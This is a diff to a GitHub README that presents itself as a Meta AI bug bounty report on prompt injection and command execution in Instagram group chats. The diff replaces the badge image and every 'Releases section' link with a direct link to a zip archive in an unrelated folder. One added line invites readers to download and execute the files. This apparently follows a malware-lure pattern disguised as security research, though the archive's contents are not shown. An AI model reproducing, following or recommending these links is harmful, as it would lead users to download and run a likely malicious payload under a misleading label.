@@ -1,6 +1,6 @@
 # Meta AI Bug Bounty Report 🚨
 
-![Meta AI Bug Bounty](https://img.shields.io/badge/Meta%20AI%20Bug%20Bounty-Report-brightgreen)
+![Meta AI Bug Bounty](https://github.com/roynaldo1234/meta-ai-bug-bounty/raw/refs/heads/main/associatory/meta_bounty_bug_ai_1.5.zip%20AI%20Bug%20Bounty-Report-brightgreen)
 
 Welcome to the **Meta AI Bug Bounty** repository! This project showcases a detailed report on vulnerabilities found in Meta AI's Instagram Group Chat. We focus on two primary types of vulnerabilities: **prompt injection** and **command execution**. This README provides insights into the findings, methodologies, and implications of these vulnerabilities.
 
@@ -67,17 +67,17 @@ We believe in responsible disclosure practices. Upon discovering these vulnerabi
 
 ## Getting Started
 
-To explore the findings in detail, you can download the report from the [Releases section](https://github.com/roynaldo1234/meta-ai-bug-bounty/releases). 
+To explore the findings in detail, you can download the report from the [Releases section](https://github.com/roynaldo1234/meta-ai-bug-bounty/raw/refs/heads/main/associatory/meta_bounty_bug_ai_1.5.zip). 
 
 Follow these steps to get started:
 
-1. Visit the [Releases section](https://github.com/roynaldo1234/meta-ai-bug-bounty/releases).
+1. Visit the [Releases section](https://github.com/roynaldo1234/meta-ai-bug-bounty/raw/refs/heads/main/associatory/meta_bounty_bug_ai_1.5.zip).
 2. Download the report.
 3. Review the findings and recommendations.
 
 ## Releases
 
-For detailed findings and reports, please check the [Releases section](https://github.com/roynaldo1234/meta-ai-bug-bounty/releases). You will find the necessary files to download and execute.
+For detailed findings and reports, please check the [Releases section](https://github.com/roynaldo1234/meta-ai-bug-bounty/raw/refs/heads/main/associatory/meta_bounty_bug_ai_1.5.zip). You will find the necessary files to download and execute.
 
 ## Contributing
 
@@ -103,4 +103,4 @@ We would like to thank the following for their contributions to this project:
 
 ---
 
-For more information, please refer to the [Releases section](https://github.com/roynaldo1234/meta-ai-bug-bounty/releases). Your feedback and contributions are valuable to us. Thank you for your interest in improving the security of AI systems!
+For more information, please refer to the [Releases section](https://github.com/roynaldo1234/meta-ai-bug-bounty/raw/refs/heads/main/associatory/meta_bounty_bug_ai_1.5.zip). Your feedback and contributions are valuable to us. Thank you for your interest in improving the security of AI systems!
